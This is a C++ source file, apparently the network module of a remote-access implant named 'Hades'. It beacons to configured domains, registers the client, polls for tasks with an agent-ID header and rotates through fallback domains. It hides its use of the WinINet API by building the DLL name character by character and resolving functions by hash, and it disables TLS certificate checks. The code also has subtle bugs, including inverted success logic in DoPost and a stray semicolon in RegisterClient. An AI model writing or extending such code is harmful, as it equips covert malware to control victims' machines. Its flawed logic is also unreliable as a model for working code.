#include "network.hpp"
#include "../hades/hades.h"
#include <stdio.h>



Network::Network(ULONG id) {
	this->HadesID = id;
	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
	if (this->HttpApis == NULL) {
		DEBUG_LOG("Failed Allocating HttpApis: %d", GetLastError());
	}
	char buf[12];
	buf[0]  = 'w';
	buf[1]  = 'i';
	buf[2]  = 'n';
	buf[3]  = 'i';
	buf[4]  = 'n';
	buf[5]  = 'e';
	buf[6]  = 't';
	buf[7]  = '.';
	buf[8]  = 'd';
	buf[9]  = 'l';
	buf[10] = 'l';
	buf[11] = '\0';

	hades->Modules.WININET = hades->WinApis.LoadLibraryA(buf);
	if (!hades->Modules.WININET) {
		DEBUG_LOG("Failed loading Wininet: %d", GetLastError());
	}
	if (hades->Modules.WININET) {
		this->HttpApis->InternetOpenA          = (decltype(this->HttpApis->InternetOpenA))GetProc(hades->Modules.WININET, HASHED_InternerOpenA);
		this->HttpApis->HttpAddRequestHeadersA = (decltype(this->HttpApis->HttpAddRequestHeadersA))GetProc(hades->Modules.WININET, HASHED_AddHeaders);
		this->HttpApis->HttpOpenRequestA	   = (decltype(this->HttpApis->HttpOpenRequestA))GetProc(hades->Modules.WININET, HASHED_OpenRequest);
		this->HttpApis->HttpSendRequestA	   = (decltype(this->HttpApis->HttpSendRequestA))GetProc(hades->Modules.WININET, HASHED_SendRequest);
		this->HttpApis->InternetCloseHandle	   = (decltype(this->HttpApis->InternetCloseHandle))GetProc(hades->Modules.WININET, HASHED_InternetCloseHandle);
		this->HttpApis->InternetConnectA	   = (decltype(this->HttpApis->InternetConnectA))GetProc(hades->Modules.WININET, HASHED_InternetConnect);
		this->HttpApis->InternetReadFile	   = (decltype(this->HttpApis->InternetReadFile))GetProc(hades->Modules.WININET, HASHED_InternetReadFile);
		this->HttpApis->InternetSetOptionA	   = (decltype(this->HttpApis->InternetSetOptionA))GetProc(hades->Modules.WININET, HASHED_InternetSetOptionA);
		this->HttpApis->HttpQueryInfoA         = (decltype(this->HttpApis->HttpQueryInfoA))GetProc(hades->Modules.WININET, HASHED_HttpQueryInfoA);
	}

	this->reqFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
					 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;

}




BOOL Network::DoPost(PBYTE toSend, SIZE_T len, DomainEntry* domain, ULONG id) {
	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;
	DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
	BOOL ok = FALSE;

	DEBUG_LOG("Sending Request to %s%s\n", domain->domain, conf->PostEndpoint);
	hInternrt = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternrt) goto CLEANUP;

	hConnect = this->HttpApis->InternetConnectA(hInternrt, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) goto CLEANUP;


	if (domain->isHttps) {
		flags |= INTERNET_FLAG_SECURE;
	}

	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", conf->PostEndpoint, NULL, NULL, NULL, flags, 0);
	if (!hRequest) goto CLEANUP;
	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));

	if (this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)toSend, len)) goto CLEANUP;
	ok = TRUE;

CLEANUP:
	if (hRequest) { this->HttpApis->InternetCloseHandle(hRequest); hRequest = NULL; }
	if (hConnect) { this->HttpApis->InternetCloseHandle(hConnect); hConnect = NULL; }
	if (hInternrt) { this->HttpApis->InternetCloseHandle(hInternrt); hInternrt = NULL; }

	if (!ok) {
		return FALSE;
	}

	return TRUE;
}



BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT *FinalSize, UINT *capacity) {
	HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;

	UINT chunk = 4096;
	UINT NewCapacity = size;
	UINT Length = 0;

	DWORD StatusCode = 0;
	DWORD ScSize = sizeof(StatusCode);
	DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;


	BOOL ok = FALSE;
	BOOL Res = FALSE;

	char buf[64];
	snprintf(buf, 64, "X-Agent-ID: %d\r\n", id);

	hInternet = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) goto CLEANUP;

	hConnect = this->HttpApis->InternetConnectA(hInternet, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) goto CLEANUP;

	if (domain->isHttps) {
		flags |= INTERNET_FLAG_SECURE;
	}

	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "GET", conf->GetEndpoint, NULL, NULL, NULL, flags, 0);
	if (!hRequest) goto CLEANUP;
	this->HttpApis->HttpAddRequestHeadersA(hRequest, buf, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));

	if (!this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) goto CLEANUP;

	Res = this->HttpApis->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &StatusCode, &ScSize, NULL);

	if (!Res) goto CLEANUP;
	

	if (StatusCode == 204) {
		ok = TRUE;
		*FinalSize = 0;
		goto CLEANUP;
	}

	if (StatusCode == 200) {
		while (TRUE) {
			if (Length + chunk > NewCapacity) {
				NewCapacity *= 2;
				PBYTE tmp = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, *ResponseBuf, NewCapacity);
				*ResponseBuf = tmp;
			}
			DWORD BytesRead = 0;
			if (!this->HttpApis->InternetReadFile(hRequest, *ResponseBuf + Length, chunk, &BytesRead)) goto CLEANUP;
			if (BytesRead == 0) break;
			Length += BytesRead;
		}
	}
	
	*FinalSize = Length;
	*capacity = NewCapacity;
	ok = TRUE;


	
	
CLEANUP:
	if (hRequest) { this->HttpApis->InternetCloseHandle(hRequest); hRequest = NULL; }
	if (hConnect) { this->HttpApis->InternetCloseHandle(hConnect); hConnect = NULL; }
	if (hInternet) { this->HttpApis->InternetCloseHandle(hInternet); hInternet = NULL; }

	if (!ok) {
		return FALSE;
	}

	return TRUE;
}




BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
	BOOL isRegistered = FALSE;

	for (int i = 0; i < conf->domaincounts && !isRegistered; i++) {
		if (conf->domains[i].isDead) {
			continue;
		}

		UINT retrys = MAX_RETRYS;
		for (int i = 0; i < retrys; i++) {

			if (this->DoPost(Data, DataLength, &conf->domains[i])); {
				isRegistered = TRUE;
			}

			LONGLONG delay = BASE_DELAY_MS * (1 << i);
			if (delay >= MAX_DELAY_MS) {
				delay = MAX_DELAY_MS;
				LONGLONG time = -(LONGLONG)delay * 1000;
				this->NetSleep(time);
				break;
			}
			
		}

		if (!isRegistered) {
			if   (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
			else { conf->domains[i].isSecondChance = TRUE; }
		}


	}
	return isRegistered;
}


BOOL Network::GetTask(PBYTE* OutData, SIZE_T BufSize, UINT *FinalSize, UINT *Capacity) {
	BOOL ok = FALSE;
	for (INT i = 0; i < conf->domaincounts && !ok; i++) {
		if (this->DoGet(OutData, BufSize, &conf->domains[i], this->HadesID, FinalSize, Capacity)) {
			ok = TRUE;
		}

	}


	return ok;
}


BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
	return TRUE;
}
void Network::NetSleep(LONGLONG time) {
	LARGE_INTEGER delay;
	delay.QuadPart = time;
	hades->NtApis.NtDelayExecution(FALSE, &delay);
}

Network* g_Network = NULL;